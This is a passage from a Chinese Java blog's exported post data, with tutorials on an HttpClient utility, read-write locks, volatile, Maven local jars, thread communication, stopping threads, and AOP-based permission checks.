httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //封装请求参数 packageHeader(headers,httpPost); //封装请求头 packageFormParam(params,httpPost); CloseableHttpResponse httpResponse = null; try{ return getResponse(httpResponse,httpClient,httpPost); }finally { release(httpResponse,httpClient); } } /** * description 表单方式的post * @param url 请求头 * @param headers 请求头 * @param params 请求参数 * @return JSONObject * @throws Exception */ public static JSONObject doJsonPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{ // 创建httpClient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); // 创建http对象 HttpPost httpPost = new HttpPost(url); httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //封装请求参数 packageHeader(headers,httpPost); //封装请求头 packageJsonParam(params,httpPost); CloseableHttpResponse httpResponse = null; try{ return getResponse(httpResponse,httpClient,httpPost); }finally { release(httpResponse,httpClient); } } /** * Description: 封装请求头 * @param params * @param httpMethod */ public static void packageHeader(Map&lt;String, String&gt; params, HttpRequestBase httpMethod) { // 封装请求头 if (params != null) { Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { // 设置到请求头到HttpRequestBase对象中 httpMethod.setHeader(entry.getKey(), entry.getValue()); } } } /** * Description: 封装表单请求参数 * * @param params * @param httpMethod * @throws UnsupportedEncodingException */ public static void packageFormParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod) throws UnsupportedEncodingException { // 封装请求参数 if (params != null) { List&lt;NameValuePair&gt; nvps = new ArrayList&lt;NameValuePair&gt;(); Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { nvps.add(new BasicNameValuePair(entry.getKey(), entry.getValue())); } // 设置到请求的http对象中 httpMethod.setEntity(new UrlEncodedFormEntity(nvps, ENCODING)); } } /** * Description: 封装json请求参数 * * @param params * @param httpMethod * @throws UnsupportedEncodingException */ public static void packageJsonParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod) throws UnsupportedEncodingException { // 封装请求参数 if (params != null) { JSONObject jsonParam = new JSONObject(); Set&lt;Map.Entry&lt;String,String&gt;&gt; entrySet = params.entrySet(); for(Map.Entry&lt;String,String&gt; entry : entrySet){ jsonParam.put(entry.getKey(),entry.getValue()); } StringEntity entity = new StringEntity(jsonParam.toString(),ENCODING); entity.setContentEncoding(ENCODING); entity.setContentType(&quot;application/json&quot;); // 设置到请求的http对象中 httpMethod.setEntity(entity); } } /** * Description: 释放资源 * * @param httpResponse * @param httpClient * @throws IOException */ public static void release(CloseableHttpResponse httpResponse, CloseableHttpClient httpClient) throws IOException { // 释放资源 if (httpResponse != null) { httpResponse.close(); } if (httpClient != null) { httpClient.close(); } } /** * Description: 获得响应结果 * * @param httpResponse * @param httpClient * @param httpMethod * @return * @throws Exception */ public static JSONObject getResponse(CloseableHttpResponse httpResponse, CloseableHttpClient httpClient, HttpRequestBase httpMethod) throws Exception { // 执行请求 httpResponse = httpClient.execute(httpMethod); // 获取返回结果 if (httpResponse != null &amp;&amp; httpResponse.getStatusLine() != null) { StringBuffer content = new StringBuffer(); if (httpResponse.getEntity() != null) { content.append(EntityUtils.toString(httpResponse.getEntity(), ENCODING)); } return JSON.parseObject(content.toString()); } JSONObject data = new JSONObject(); data.put(&quot;code&quot;,&quot;999&quot;); data.put(&quot;content&quot;,&quot;网络异常&quot;); return data; } }工具包功能+ 提供get,post表单请求,postJson请求 + 还有其他功能,欢迎来pr,[项目地址](https://github.com/huskyui/httpclientutil)写工具包的原因因为要用到微信的接口,只能自己准备一个.","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"httpClient工具类","slug":"httpClient工具类","permalink":"http://yoursite.com/tags/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/"}]},{"title":"读写锁","slug":"读写锁","date":"2019-09-02T06:29:08.000Z","updated":"2020-11-14T17:10:57.343Z","comments":true,"path":"2019/09/02/读写锁/","link":"","permalink":"http://yoursite.com/2019/09/02/%E8%AF%BB%E5%86%99%E9%94%81/","excerpt":"","text":"readWriteLock 读写锁也就是共享-独占锁,读锁之间可以共享锁,但是读锁和写锁之间不可以共享,写锁之间也不可共享. 学习的这个读写锁的设计,它的核心是 1.多个线程(读锁,写锁)都是用同一个对象锁,然后用sychronized来唤醒全部以及沉睡. 2.定义了读锁数量变量,当前写锁数量,当前等待写锁数量来是否需要睡眠和唤醒 lock接口/** * 读写锁的内涵就是共享-独占锁 * @author husky * @date 2019/8/27 9:44 */ public interface Lock { /**获取显示锁,没有获得锁的线程将被阻塞*/ void lock() throws InterruptedException; /**释放锁*/ void unlock(); }ReadWriteLock接口/** * @author husky * @date 2019/8/27 9:50 */ public interface ReadWriteLock { /**创建reader锁*/ Lock readLock(); /**创建write锁*/ Lock writeLock(); /**获取当前有多少线程正在执行写操作*/ int getWritingWriters(); /**获取当前有多少线程正在等待获取写入锁*/ int getWaitingWriters(); /**获取当前有多少线程正在执行reader锁*/ int getReadingReaders(); /**工厂方法,创建ReadWriteLock*/ static ReadWriteLock readWriteLock(){ return new ReadWriteLockImpl(); } /**工厂方法,创建ReadWriteLock,并且传入preferWriter*/ static ReadWriteLock readWriteLock(boolean preferWriter){ return new ReadWriteLockImpl(preferWriter); } }readwriteLock实现类/** * 包可见,创建时使用ReadWriteLock的create方法 * @author husky * @date 2019/8/27 10:59 */ public class ReadWriteLockImpl implements ReadWriteLock { /**定义对象锁*/ private final Object MUTEX = new Object(); /**当前有多少线程正在写入*/ private int writingWriters = 0; /**当前有多少线程正在等待写入*/ private int waitingWriters = 0; /**当前有多少线程正在read*/ private int readingReaders = 0; /**read和write的偏好设置*/ private boolean preferWriter; public ReadWriteLockImpl(){ this(true); } public ReadWriteLockImpl(boolean preferWriter){ this.preferWriter = preferWriter; } @Override public Lock readLock() { return new ReadLock(this); } @Override public Lock writeLock() { return new WriteLock(this); } /**使写线程的数量增加*/ void incrementWritingWriters(){ this.writingWriters++; } /**使等待写入的线程数量增加*/ void incrementWaitingWriters(){ this.waitingWriters++; } /**使读线程的数量增加*/ void incrementReadingReaders(){ this.readingReaders++; } /**使写线程的数量减少*/ void decrementWritingWriters(){ this.writingWriters--; } /**使等待获取写入锁的数量减一*/ void decrementWaitingWriters(){ this.waitingWriters--; } /**使读取线程的数量减一*/ void decrementReadingReaders(){ this.readingReaders--; } @Override public int getWritingWriters() { return this.writingWriters; } @Override public int getWaitingWriters() { return this.waitingWriters; } @Override public int getReadingReaders() { return this.readingReaders; } /**获取对象锁*/ Object getMutex(){ return this.MUTEX; } /**获取当前是否偏向写锁*/ boolean getPreferWriter(){ return this.preferWriter; } /**设置写锁偏好*/ void changePrefer(boolean preferWriter){ this.preferWriter = preferWriter; } }readLock/** * @author husky * @date 2019/8/29 16:38 */ class ReadLock implements Lock{ private final ReadWriteLockImpl readWriteLock; ReadLock(ReadWriteLockImpl readWriteLock){ this.readWriteLock = readWriteLock; } @Override public void lock() throws InterruptedException { //使用mutex作为锁 synchronized (readWriteLock.getMutex()){ //若此时有线程在进行写操作,或者偏向写锁的标志为true时那么等待写锁数量&gt;0时,就会无法获得读锁 while(readWriteLock.getWritingWriters()&gt;0||(readWriteLock.getPreferWriter()&amp;&amp;readWriteLock.getWaitingWriters()&gt;0)){ readWriteLock.getMutex().wait(); } readWriteLock.incrementReadingReaders(); } } @Override public void unlock() { //使用Mutex作为锁,并且进行同步 synchronized (readWriteLock.getMutex()){ //释放锁使当前reading的数量减一 //将perferWriter设置为true,可以使得writer线程获得更多机会 //通知唤醒与Mutex关联monitor waitset中的线程 readWriteLock.decrementReadingReaders(); readWriteLock.changePrefer(true); readWriteLock.getMutex().notifyAll(); } } }writeLock** * @author husky * @date 2019/8/29 16:55 */ class WriteLock implements Lock{ private final ReadWriteLockImpl readWriteLock; WriteLock(ReadWriteLockImpl readWriteLock){ this.readWriteLock = readWriteLock; } @Override public void lock() throws InterruptedException { synchronized (readWriteLock.getMutex()){ try{ //首先使等待获取写入锁的数字加一 readWriteLock.incrementWaitingWriters(); //如果有线程在读取数据或者写数据 while(readWriteLock.getWritingWriters()&gt;0||readWriteLock.getReadingReaders()&gt;0){ readWriteLock.getMutex().wait(); } }finally { //最终减少等待写线程的数量 readWriteLock.decrementWaitingWriters(); } //获取到锁后,增加正在写锁的数量 readWriteLock.incrementWritingWriters(); } } @Override public void unlock() { synchronized (readWriteLock.getMutex()){ //减少正在写入锁的线程计数器 readWriteLock.decrementWritingWriters(); //将偏好设置成false,可以使得读锁被更快速的获得 readWriteLock.changePrefer(false); //通知唤醒其他在Mutext monitor wautset中其他线程 readWriteLock.getMutex().notifyAll(); } } }操作数据接口import java.util.ArrayList; import java.util.List; import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/8/29 17:12 */ public class ShareData { /**定义共享数据(资源)*/ private final List&lt;Character&gt; container = new ArrayList&lt;&gt;(); /**构造ReadWriteLock*/ private final ReadWriteLock readWriteLock = ReadWriteLock.readWriteLock(); /**创建读取锁*/ private final Lock readLock = readWriteLock.readLock(); /**创建写入锁*/ private final Lock writeLock = readWriteLock.writeLock(); private final int length; public ShareData(int length){ this.length = length; for(int i = 0;i &lt; length;i++){ container.add(i,&apos;c&apos;); } } public char[] read() throws InterruptedException{ try{ //首先进行读锁进行lock readLock.lock(); char[] newBuffer = new char[length]; for(int i = 0;i &lt; length;i++){ newBuffer[i] = container.get(i); } slowly(); return newBuffer; }finally { //当读取操作结束后,释放锁 readLock.unlock(); } } public void write(char c) throws InterruptedException{ try{ writeLock.lock(); for(int i = 0;i &lt; length;i++){ this.container.add(i,c); } slowly(); }finally { writeLock.unlock(); } } public void slowly(){ try{ TimeUnit.SECONDS.sleep(1); }catch (InterruptedException e){ e.printStackTrace(); } } }测试类import static java.lang.Thread.currentThread; /** * @author husky * @date 2019/8/29 17:12 */ public class ReadWriteLockTest { /**this is the example for read write lock*/ private final static String text = &quot;Thisistheexampleforreadwritelock&quot;; public static void main(String[] args) { //定义共享数据 final ShareData shareData = new ShareData(50); //创建两个线程进行数据写操作 for(int i = 0;i &lt; 2;i++){ new Thread(()-&gt;{ for(int index = 0;index &lt; text.length();index++){ try{ char c = text.charAt(index); shareData.write(c); System.out.println(currentThread()+&quot; write &quot; + c); }catch (InterruptedException e){ e.printStackTrace(); } } }).start(); } //创建10个线程进行数据读操作 for(int i = 0;i &lt; 10;i++){ new Thread(()-&gt;{ while(true){ try { System.out.println(currentThread() + &quot; read &quot; + new String(shareData.read())); } catch (InterruptedException e) { e.printStackTrace(); } } }).start(); } }总结 ReentrantReadWriteLock的操作流程和上面的操作相似,具体用到后续再聊 读写锁应用场景可以在缓存部分或者在一些集合类中使用","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"读写锁","slug":"读写锁","permalink":"http://yoursite.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"}]},{"title":"volatile关键字","slug":"volatile关键字","date":"2019-08-21T10:34:08.000Z","updated":"2020-11-14T17:10:57.832Z","comments":true,"path":"2019/08/21/volatile关键字/","link":"","permalink":"http://yoursite.com/2019/08/21/volatile%E5%85%B3%E9%94%AE%E5%AD%97/","excerpt":"","text":"内存,cache,和寄存器之间的关系寄存器是用于计算数据,而cpu所能访问的数据都是主存中的.寄存器速度随时代行长越来越快,但是读取数据却是没有太大发展.所以有了cache这样的东西 高并发三大特性 原子性 多个原子性操作在一起就不再是原子性操作了 简单的读取和赋值操作是原子性的,将一个变量赋给另外一个变量的操作不是原子性的. Java内存模型(JMM)只保证了基本读取和赋值的原子性操作,其他均不保证,如果需要某些代码块能够拥有原子性,需要使用关键字synchronized,或者JUC中的lock.如果想要使用int等类型自增操作具备原子性,可以使用JUC包下的原子封装类型java.util.concurrent.atomic.* 总结:volatile关键字不具备原子性的语义,需要synchronized或者lock 可见性 使用volatile,当一个变量被volatile关键字修饰时,对于共享资源的读操作会直接在主内存中进行,对于共享资源的写操作当然是先修改工作内存,但是修改结束后,会立刻刷新到主内存中. 通过synchronized关键字能够保证可见性,synchronized关键字能够保证同一时刻只有一个线程获得锁,然后指向同步方法,并且还会确保在锁释放之前,会将对变量的修改刷新到主内存中. 通过JUC提供的显示锁Lock也能够保证可见性,Lock的lock方法能够保证在同一个时刻只有一个线程获取锁然后执行同步方法,并确保在锁释放之前将对变量的修改刷新到主内存中. 有序性 使用volatile关键字来保证有序性 使用synchronized关键字来保证有序性 使用Lock来保证有序性 总结:volatile可以实现可见性,有序性,但是不可实现原子性 volatile和synchronized 使用上的区别 volatile关键字只能用于修饰实例变量或者类变量,不能修饰方法以及方法参数和局部变量,常量等 synchronized关键字不能用于对变量的修饰,只能用于修饰方法或者语句块 volatile修饰的变量可以为null,synchronized关键字同步语句框的monitor对象不能为null 对原子性的保证 volatile无法保证原子性 由于synchronized是一种排他的机制,因此被synchronized关键字修饰的同步代码无法被中断打断,因此能够保证代码的原子性 可见性的保证 两者均可以保证共享资源在多线程间的可见性,但是实现机制完全不同. synchronized借助于JVM指令monitor enter和monitor exit对通过排他的方式使得同步代码串行化,在monitor exit时所有共享数据都会被刷新到主内存中. 相较与synchronized关键字volatile使用机器指令(偏硬件)”lock;”的方式迫使其他线程工作内存中的数据失效,不得到主内存中进行再次加载. 有序性的保证 volatile关键字禁止JVM编译器以及处理器对其进行重排序,所以它能够保证有序性 虽然synchronized关键字所修饰的同步方法也可以保证顺序性,但是这种顺序性是以程序的串行化换来的,在synchronized关键字所修饰的代码块中代码块代码指令也发生指令重排序的情况 其他 volatile不会使线程陷入阻塞 synchronized关键字会使线程进入阻塞状态.","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"voliate","slug":"voliate","permalink":"http://yoursite.com/tags/voliate/"}]},{"title":"springboot导入本地jar包","slug":"springboot导入本地jar包","date":"2019-08-15T10:35:22.000Z","updated":"2020-11-14T17:10:58.334Z","comments":true,"path":"2019/08/15/springboot导入本地jar包/","link":"","permalink":"http://yoursite.com/2019/08/15/springboot%E5%AF%BC%E5%85%A5%E6%9C%AC%E5%9C%B0jar%E5%8C%85/","excerpt":"","text":"springboot导入本地jar包首先在src下建目录lib,并将需要的本地jar包放入 在pom.xml下修改如下 &lt;!-- 导入云顿数据风控的jar --&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt; &lt;version&gt;3.0.6&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;!-- 导入云顿数据风控的jar END--&gt;打包修改plugin中,添加配置 &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;可能出现的warning[WARNING] Some problems were encountered while building the effective model for com.seniortech:beauty-hair-cms:jar:1.0.0 [WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-afs:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar will be unresolvable by dependent projects @ line 111, column 25 [WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-core:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar will be unresolvable by dependent projects @ line 118, column 25 [WARNING] [WARNING] It is highly recommended to fix these problems because they threaten the stability of your build. 解决方法,Use ${pom.basedir} instead of ${project.basedir}. 修改后的pom&lt;!-- 导入云顿数据风控的jar --&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;aliyun&lt;/groupId&gt; &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt; &lt;version&gt;3.0.6&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;!-- 导入云顿数据风控的jar END--&gt;","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"},{"name":"打包","slug":"打包","permalink":"http://yoursite.com/tags/%E6%89%93%E5%8C%85/"}]},{"title":"线程通信","slug":"线程通信","date":"2019-07-16T10:24:44.000Z","updated":"2020-11-14T17:10:58.970Z","comments":true,"path":"2019/07/16/线程通信/","link":"","permalink":"http://yoursite.com/2019/07/16/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/","excerpt":"","text":"线程间通信 线程间通信会有一个存储任务的队列,队列有以下三种状况 队列为空,会通知消费者等待, 队列满时,会通知生产者等待 队列有任务但不为空,消费者正常运行,生产者正常运行 单线程通信(一个生产者一个消费者) 使用 Object 中的方法, wait() 和 notify() 来实现 wait() wait() 和 notify() 必须获取对象,所以两个方法都需要在同步方法中使用( synchroized ) 当前线程执行了该对象的 wait 方法之后,将会放弃对该monitor的所有权并且进入与该对象关联的 wait set 中,也就是说,一旦当前线程执行了某个 object 的 wait 方法之后,它就会释放对该对象monitor的所有权,其他线程也会有机会继续争夺该monitor的所有权 notify() notify() 会唤醒单个正在执行该对象的wait方法的线程 唤醒的线程需要重新获取对该对象所关联monitor的lock才能执行 import java.util.LinkedList; /** * EventQuque 任务队列,提供添加任务方法,消费方法. * @author husky * @date 2019/7/12 11:21 */ public class EventQueue { private final int max; static class Event{ } private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;(); private final static Integer DEDAULT_MAX_EVENT = 10; public EventQueue(int max) { this.max = max; } public EventQueue(){ this(DEDAULT_MAX_EVENT); } public void offer(Event event){ synchronized (events){ if(events.size() &gt;= DEDAULT_MAX_EVENT){ try { console(&quot;the event list is full,wait consumer consume&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } console(&quot;the event is submit&quot;); events.addLast(event); events.notify(); } } public void take(){ synchronized (events){ if(events.size() &lt;= 0){ try { console(&quot;the event list is empty,wait producer produce&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } Event eventFirst = events.getFirst(); events.removeFirst(); console(&quot;Event is &quot; + eventFirst + &quot;handler&quot;); events.notify(); } } public static void console(String msg){ System.out.println(msg); } } import java.util.concurrent.TimeUnit; /** * EventClient 使用 * @author husky * @date 2019/7/12 11:44 */ public class EventClient { public static void main(String[] args) { final EventQueue eventQueue = new EventQueue(); new Thread(()-&gt;{ for(;;){ eventQueue.offer(new EventQueue.Event()); } },&quot;producer&quot;).start(); new Thread(()-&gt;{ for(;;){ eventQueue.take(); //模拟消费event消耗时间 try { TimeUnit.MICROSECONDS.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } },&quot;consumer&quot;).start(); }多线程通信(多生成者多消费者) notifyAll() 方法可以唤醒由于调用 wait() 方法阻塞的线程, notify() 可以唤醒起一个线程,而 notifyAll() 是唤醒所有阻塞的线程,所有线程需要竞争monitor的锁. import java.util.LinkedList; /** * EventQueue 任务队列 * @author husky * @date 2019/7/12 14:17 * 多线程间通信 */ public class EventQueue { private final int max; static class Event{ } private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;(); private final static Integer DEDAULT_MAX_EVENT = 10; public EventQueue(int max) { this.max = max; } public EventQueue(){ this(DEDAULT_MAX_EVENT); } public void offer(Event event){ synchronized (events){ while(events.size() &gt;= DEDAULT_MAX_EVENT){ try { console(&quot;the event list is full,wait consumer consume&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } console(Thread.currentThread().getName()+&quot;the event is submit&quot;); events.addLast(event); events.notifyAll(); } } public void take(){ synchronized (events){ while(events.size() &lt;= 0){ try { console(&quot;the event list is empty,wait producer produce&quot;); events.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } Event eventFirst = events.getFirst(); events.removeFirst(); console(Thread.currentThread().getName()+&quot;Event is &quot; + eventFirst + &quot;handler&quot;); events.notifyAll(); } } public static void console(String msg){ System.out.println(msg); } } import java.util.concurrent.TimeUnit; import java.util.stream.IntStream; /** * @author husky * @date 2019/7/12 14:19 */ public class EventClient { public static void main(String[] args) { final EventQueue eventQueue = new EventQueue(); IntStream.rangeClosed(0,2).mapToObj(i-&gt;new Thread(&quot;producer-&quot;+i){ @Override public void run() { for(;;) { eventQueue.offer(new EventQueue.Event()); } } }).forEach(Thread::start); IntStream.rangeClosed(0,3).mapToObj(i-&gt;new Thread(&quot;consumer-&quot;+i){ @Override public void run() { for(;;){ eventQueue.take(); try { TimeUnit.MICROSECONDS.sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } } }).forEach(Thread::start); } } 其中需要解释的是,为什么单线程通信在判断是否阻塞时,使用if,而多线程判断使用while.因为多个在一起时,有可能多个同时阻塞,被唤醒时,如果用if的话,很多条件并没有再次判断. 而使用while可以在执行 wait() 之后再次判断条件是否正确,这里也就牵扯到wait set的事情","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"线程通信","slug":"线程通信","permalink":"http://yoursite.com/tags/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"}]},{"title":"关闭线程","slug":"关闭线程","date":"2019-07-12T09:27:41.000Z","updated":"2020-11-14T17:10:59.765Z","comments":true,"path":"2019/07/12/关闭线程/","link":"","permalink":"http://yoursite.com/2019/07/12/%E5%85%B3%E9%97%AD%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"关闭线程通过 interruptionException 关闭import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:23 */ public class CloseThreadByInterruptException { public static void main(String[] args) { Thread workThread = new Thread(){ @Override public void run() { System.out.println(&quot;i will start work&quot;); for(;;){ //working //使用时间模拟工作 long start = System.currentTimeMillis(); long end = start + 1000 * 5; while(System.currentTimeMillis() &lt;= end){ //do nothing } try{ TimeUnit.MICROSECONDS.sleep(1); }catch (InterruptedException e){ break; } } System.out.println(&quot;i will be exiting&quot;); } }; workThread.start(); try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;work thread will be closed&quot;); workThread.interrupt(); } }通过 interrupt statusimport java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:16 */ public class CloseThreadByInterruptStatus { public static void main(String[] args) throws InterruptedException { Thread t1 = new Thread(){ @Override public void run() { while(!isInterrupted()){ //do something } } }; t1.start(); // ensure thread is running TimeUnit.SECONDS.sleep(1); System.out.println(&quot;Thread will be closed&quot;); t1.interrupt(); } }通过 volatile 和 interrupt status 关闭import java.util.concurrent.TimeUnit; /** * @author husky * @date 2019/7/11 11:39 */ public class CloseThreadByVolatile { static class WorkThread extends Thread{ private volatile boolean flag = false; @Override public void run() { System.out.println(&quot;i will start work&quot;); while(!flag&amp;&amp;!isInterrupted()){ //正在执行 } System.out.println(&quot;i will be exiting&quot;); } public void close(){ this.flag = true; this.interrupt(); } } public static void main(String[] args) { WorkThread workThread = new WorkThread(); workThread.start(); try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;System will be interrupt&quot;); workThread.close(); } }总结 interrupt status容易被清除,所以推荐使用voliate和interrupt status混合使用 该文学习于汪文君高并发编程","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"thread","slug":"thread","permalink":"http://yoursite.com/tags/thread/"}]},{"title":"aop+annotation实现权限管理","slug":"aop+annotation实现权限管理","date":"2019-06-24T14:43:17.000Z","updated":"2020-11-14T17:11:00.301Z","comments":true,"path":"2019/06/24/aop+annotation实现权限管理/","link":"","permalink":"http://yoursite.com/2019/06/24/aop+annotation%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/","excerpt":"","text":"功能需求遇到一个问题,要实现权限管理,也就是有些按钮点击时要提示,没有权限,有很多接口,如果要是按照老的方式,就是每个方法都手写权限判断.十分浪费时间 问题的重要点 重复的工作,如何解决 项目并没有引入shiro之类的模块而且session是保存在redis中的,所以分布式的环境也可使用session,如何从session中获取用户信息 话不多少,直接说怎么做 采用aop实现重复的权限判断 根据RequestContextHolder这个类可以获取session Permission注解import java.lang.annotation.*; @Inherited @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.METHOD}) /** * 此处在使用时,可以在方法上面加注解 * example: @Permission({&quot;/admin/hasPermission&quot;,&quot;/admin/isAlive&quot;}) * */ public @interface Permission { String[] value() default {}; }PermissionAopimport com.seniortech.test.annotation.Permission; import com.seniortech.test.entity.Admin; import com.seniortech.test.response.LayData; import com.seniortech.test.service.PermissionService; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Pointcut; import org.springframework.context.annotation.Configuration; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.aspectj.lang.reflect.MethodSignature; import javax.annotation.Resource; import javax.servlet.http.HttpSession; import java.lang.reflect.Method; import java.util.Objects; /** * @author husky * @date 2019/6/24 17:46 */ @Aspect @Configuration public class PermissionAop { @Resource private PermissionService permissionService; // 定义切点Pointcut @Pointcut(value=&quot;@annotation(com.seniortech.test.annotation.Permission)&quot;) public void excudeService(){ } @Around(&quot;excudeService()&quot;) public Object doAround(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { HttpSession session = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest().getSession(); Admin admin =(Admin) session.getAttribute(&quot;admin&quot;);//上面两行代码可以获取到request,即可以获取session if(!Objects.isNull(admin)){ System.out.println(admin); MethodSignature ms = (MethodSignature) proceedingJoinPoint.getSignature(); Method method = ms.getMethod(); Permission permission = ((Method) method).getAnnotation(Permission.class); String[] permissions = permission.value();//此处可以获取@Permission中的注解,字符串数组 //当然要对这个permissions这个判断是否长度为0,本代码中未判断是不严谨的 if(!permissionService.hasPermission(admin.getId(),permissions)){ return LayData.builder().code(-1).msg(&quot;没有权限&quot;).build(); } //此处的LayData是response的统一格式 } Object result = proceedingJoinPoint.proceed(); return result; } }前端ajax处的封装代码/** * ajax封装 * url 发送请求的地址 * data 发送到服务器的数据,数组存储,如: {&quot;date&quot;:new Date().getTime(),&quot;state&quot;:1} * successfn 成功回调函数 * errorfn 失败回调函数 * */ jQuery.postAjax = function (url,data,successfn,errorfn) { data = (data === null || data === &quot;&quot; || typeof (data) === &quot;undefined&quot;) ?{&quot;date&quot;:new Date().getTime()}:data; var loadObj = layer.load(2); $.ajax({ type: &quot;post&quot;, data: data, url: url, success: function (d,textStatus,jqXHR) { layer.close(loadObj); if(d.code === -100){//登录状态已失效 layer.confirm(&quot;登录已失效,请重新登录&quot;, {icon:2,title: &apos;提示&apos;,btn: [&apos;确定&apos;], closeBtn:0},function (index) { window.location.href = &quot;/login.html&quot;; }) return; } if(d.code === -1) {//无权操作或权限被禁 console.log(&quot;没有权限&quot;); layer.msg(d.msg,{icon:0}); return; } successfn(d); }, error:function (e) { layer.close(loadObj); if(errorfn !== undefined){ errorfn(e); } } }) }后端调用代码@Permission(&quot;/admin/disable&quot;) @RequestMapping(&quot;/disable&quot;) @ResponseBody public Object administratorDisable(Integer userId){ Integer returnCode = adminService.setStatus(Admin.builder().id(userId.longValue()).status(false).build()); if(returnCode == 0){ return LayData.builder().code(400).build(); }else{ return LayData.builder().code(200).build(); } } 我会更加赞同一些观点,偷懒也是人类进步的阶梯. 在我发现要做重复的事情的时候,第一个想到的事情,应该是十分有方法简化它 此处,要感谢guns开源框架,给我的灵感,使用注解实现aop aop中获取request 注解配合aop使用,来自guns源码","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"aop","slug":"aop","permalink":"http://yoursite.com/tags/aop/"},{"name":"annotation","slug":"annotation","permalink":"http://yoursite.com/tags/annotation/"}]},{"title":"git stash","slug":"git 